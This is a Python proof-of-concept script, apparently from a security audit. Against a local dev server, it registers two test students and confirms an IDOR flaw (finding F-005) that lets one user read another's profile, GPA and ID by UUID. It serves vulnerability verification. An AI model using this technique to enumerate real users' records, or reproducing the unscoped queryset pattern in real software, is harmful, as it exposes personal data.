#!/usr/bin/env python3
"""
PoC 03 — F-005 CRITICAL: IDOR on StudentProfileViewSet (queryset=all)

Demonstrates that StudentProfileViewSet uses `queryset = StudentProfile.objects.all()`
allowing any authenticated user to access any student's profile by UUID, including
names, student IDs, department, GPA, and other PII.

Exploitation chain:
  1. Register two students (A + B), approve via shell, login → obtain tokens
  2. Both create their own profiles
  3. User A lists all profiles → sees user B's profile in the list
  4. User A requests user B's profile by UUID → full PII exposed

Expected result:
  - Steps 3-4 succeed → VULNERABILITY CONFIRMED (IDOR)
"""

import requests
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from poc_helpers import (
    BASE_URL, API, MEDIA, RESULTS, log, record,
    register_and_approve, login_user,
)

RESULTS.clear()


def setup_test_data(session):
    """Register two students, approve, login, create profiles."""
    timestamp = int(time.time())

    # Student A
    log("Step 1: Register + approve + login Student A")
    token_a = register_and_approve(
        session,
        f"poc_idor_a_{timestamp}",
        "PocTest@2026!",
        f"poc_idor_a_{timestamp}@gmail.com",
        "Alice", "IDOR_TestA"
    )
    if not token_a:
        return None, None
    log(f"Student A token: {token_a[:12]}...", "OK")

    # Student B
    log("Step 2: Register + approve + login Student B")
    token_b = register_and_approve(
        session,
        f"poc_idor_b_{timestamp}",
        "PocTest@2026!",
        f"poc_idor_b_{timestamp}@gmail.com",
        "Bob", "IDOR_TestB"
    )
    if not token_b:
        return None, None
    log(f"Student B token: {token_b[:12]}...", "OK")

    # Create profile for Student A
    log("Step 3: Student A creates profile")
    profile_a_resp = session.post(f"{API}/student/profile/", json={
        "student_id": f"STU-A-{timestamp}",
        "department": "Engineering",
        "course": "BSCE",
        "year_level": "4th",
        "gpa": "3.90",
    }, headers={"Authorization": f"Token {token_a}"})
    log(f"Profile A create: {profile_a_resp.status_code}", "OK" if profile_a_resp.status_code in (200, 201) else "WARN")

    # Create profile for Student B
    log("Step 4: Student B creates profile")
    profile_b_resp = session.post(f"{API}/student/profile/", json={
        "student_id": f"STU-B-{timestamp}",
        "department": "IT",
        "course": "BSCS",
        "year_level": "2nd",
        "gpa": "3.75",
    }, headers={"Authorization": f"Token {token_b}"})
    log(f"Profile B create: {profile_b_resp.status_code}", "OK" if profile_b_resp.status_code in (200, 201) else "WARN")

    return token_a, token_b


def test_list_profiles_with_auth(session, token, student_name):
    """Baseline: list profiles WITH auth token."""
    log(f"Step 5: GET /api/student/profiles/ with {student_name}'s token")
    resp = session.get(f"{API}/student/profile/", headers={"Authorization": f"Token {token}"})
    record("F-005.1", f"Profile list WITH auth ({student_name} baseline)",
           "PASS" if resp.status_code == 200 else "FAIL", f"HTTP {resp.status_code}")

    results = resp.json()
    if isinstance(results, dict) and "results" in results:
        results = results["results"]

    if results:
        log(f"  Found {len(results)} profile(s)")
        for i, p in enumerate(results[:5]):
            sid = p.get("student_id") or p.get("id", "?")
            log(f"    Profile {i+1}: id={p.get('id','?')[:8]}..., student_id={sid}")
    return results or []


def test_idor_profile_access(session, token_a, token_b, profiles):
    """VULNERABILITY: Student A accesses Student B's profile by UUID."""
    log("Step 6: Student A attempts to access Student B's profile by UUID")

    # Find Student B's profile
    profile_b = None
    for p in profiles:
        # Check if this profile belongs to Student B (not A)
        # We can check student_id pattern or just take the second one
        if p.get("student_id", "").startswith("STU-B-") or p.get("user_name", "") == "Bob":
            profile_b = p
            break

    if not profile_b and len(profiles) >= 2:
        profile_b = profiles[-1]

    if not profile_b:
        log("Could not identify Student B's profile in results", "WARN")
        record("F-005.5", "IDOR: Student A access Student B's profile", "N/A",
               "Could not identify Student B's profile in list")
        return

    profile_b_id = profile_b.get("id")
    log(f"  Student B's profile UUID: {profile_b_id}")

    # Student A requests Student B's profile by UUID
    log(f"  Student A requests /api/student/profiles/{profile_b_id}/")
    resp = session.get(
        f"{API}/student/profile/{profile_b_id}/",
        headers={"Authorization": f"Token {token_a}"}
    )

    if resp.status_code == 200:
        data = resp.json()
        log(f"  *** IDOR CONFIRMED *** Student A retrieved Student B's profile:", "VULN")
        for key in ["student_id", "course", "department", "gpa", "year_level"]:
            if key in data:
                log(f"    {key}: {data[key]}")
        record("F-005.5", "IDOR: Student A access Student B's profile", "PASS",
               f"VULNERABLE: Student A accessed Student B's profile (UUID: {profile_b_id})")
    else:
        record("F-005.5", "IDOR: Student A access Student B's profile", "FAIL",
               f"HTTP {resp.status_code} — Access denied (not vulnerable)")


def test_idor_with_other_user_token(session, token_b, profiles):
    """VULNERABILITY: Student B accesses Student A's profile."""
    log("Step 7: Student B attempts to access Student A's profile")

    profile_a = None
    for p in profiles:
        if p.get("student_id", "").startswith("STU-A-") or p.get("user_name", "") == "Alice":
            profile_a = p
            break

    if not profile_a and len(profiles) >= 1:
        profile_a = profiles[0]

    if not profile_a:
        log("Could not identify Student A's profile", "WARN")
        record("F-005.6", "IDOR: Student B access Student A's profile", "N/A",
               "Could not identify Student A's profile")
        return

    profile_a_id = profile_a.get("id")
    log(f"  Student A's profile UUID: {profile_a_id}")

    resp = session.get(
        f"{API}/student/profile/{profile_a_id}/",
        headers={"Authorization": f"Token {token_b}"}
    )

    if resp.status_code == 200:
        data = resp.json()
        log(f"  *** IDOR CONFIRMED *** Student B retrieved Student A's profile:", "VULN")
        for key in ["student_id", "course", "department", "gpa", "year_level"]:
            if key in data:
                log(f"    {key}: {data[key]}")
        record("F-005.6", "IDOR: Student B access Student A's profile", "PASS",
               f"VULNERABLE: Student B accessed Student A's profile (UUID: {profile_a_id})")
    else:
        record("F-005.6", "IDOR: Student B access Student A's profile", "FAIL",
               f"HTTP {resp.status_code}")


def main():
    print("=" * 70)
    print("PoC 03 — F-005 CRITICAL: IDOR on Student Profile Access")
    print("=" * 70)
    print()

    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})

    token_a, token_b = setup_test_data(session)
    if not token_a or not token_b:
        print("\n[-] Setup failed. Is the dev server running on localhost:8000?")
        sys.exit(1)

    print()

    profiles = test_list_profiles_with_auth(session, token_a, "Student A")
    print()
    test_idor_profile_access(session, token_a, token_b, profiles)
    print()
    test_idor_with_other_user_token(session, token_b, profiles)
    print()

    # Summary
    print("\n" + "=" * 70)
    print("RESULTS SUMMARY")
    print("=" * 70)
    critical = [r for r in RESULTS if "IDOR" in r["description"]]
    passed_critical = [r for r in critical if r["status"] == "PASS"]

    for r in RESULTS:
        icon = "[+]" if r["status"] == "PASS" else "[-]" if r["status"] == "FAIL" else "[~]"
        print(f"  {icon} {r['id']}: {r['description']} — {r['status']}")
        if r["detail"]:
            print(f"      {r['detail']}")

    print(f"\nTotal: {len(RESULTS)} tests | Passed: {sum(1 for r in RESULTS if r['status']=='PASS')} | "
          f"Failed: {sum(1 for r in RESULTS if r['status']=='FAIL')} | N/A: {sum(1 for r in RESULTS if r['status']=='N/A')}")

    if passed_critical:
        print(f"\n*** VULNERABILITY CONFIRMED: F-005 — {len(passed_critical)} critical tests passed ***")
        print("    StudentProfileViewSet uses queryset=all, exposing all student PII to any user.")

    print()

    report_path = Path("poc_scripts/poc_03_results.json")
    report_path.parent.mkdir(exist_ok=True)
    with open(report_path, "w") as f:
        json.dump({
            "poc": "03",
            "vulnerability": "F-005",
            "severity": "CRITICAL",
            "title": "IDOR on StudentProfileViewSet (queryset=all)",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "results": RESULTS,
            "conclusion": "VULNERABILITY CONFIRMED" if passed_critical else "NOT CONFIRMED",
        }, f, indent=2)
    print(f"  Report saved to: {report_path}")


if __name__ == "__main__":
    main()
